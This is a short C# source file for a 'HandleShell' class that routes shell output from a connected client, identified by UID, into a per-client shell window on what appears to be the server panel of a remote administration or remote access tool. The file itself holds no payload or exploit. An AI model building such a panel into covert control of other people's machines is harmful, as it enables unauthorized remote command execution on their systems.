using PacketLib;
using Server.Forms;
using Server.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handlers
{
    internal class HandleShell
    {
        public HandleShell(_Client client, MsgUnpack msgUnpack)
        {
            ShellForm shellForm = (ShellForm)Application.OpenForms["Shell:" + msgUnpack.GetAsString("UID")];
            if (shellForm != null)
            {
                if (shellForm._Client == null)
                {
                    shellForm._Client = client;
                    shellForm.ConnectionCheckup.Start();
                }
                shellForm.Invoke(new MethodInvoker(() =>
                {
                    shellForm.textBox1.AppendText(msgUnpack.GetAsString("Output"));
                    shellForm.textBox1.SelectionStart = shellForm.textBox1.TextLength;
                    shellForm.textBox1.ScrollToCaret();
                }));
            }
        }
    }
}
